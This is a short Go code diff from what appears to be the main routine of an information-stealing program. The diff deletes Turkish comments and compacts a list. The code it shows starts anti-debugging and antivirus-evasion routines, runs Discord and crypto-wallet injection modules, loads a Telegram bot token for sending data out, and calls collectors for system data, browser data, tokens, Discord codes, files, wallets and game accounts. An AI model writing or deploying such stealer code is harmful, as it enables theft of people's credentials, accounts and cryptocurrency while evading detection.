@@ -55,23 +55,15 @@ func main() {
 	go antidebug.Run()
 	go antivirus.Run()
 
-	// Injection modülleri (webhook boş)
 	go discordinjection.Run("", "")
 	go walletsinjection.Run("", "", "")
 
-	// Telegram
 	botToken := CONFIG["telegram_bot_token"].(string)
 	chatID := CONFIG["telegram_chat_id"].(string)
 
-	// Veri toplayan modüller
 	actions := []func(string, string){
-		system.Run,
-		browsers.Run,
-		tokens.Run,
-		discodes.Run,
-		commonfiles.Run,
-		wallets.Run,
-		games.Run,
+		system.Run, browsers.Run, tokens.Run, discodes.Run,
+		commonfiles.Run, wallets.Run, games.Run,
 	}
 
 	for _, action := range actions {
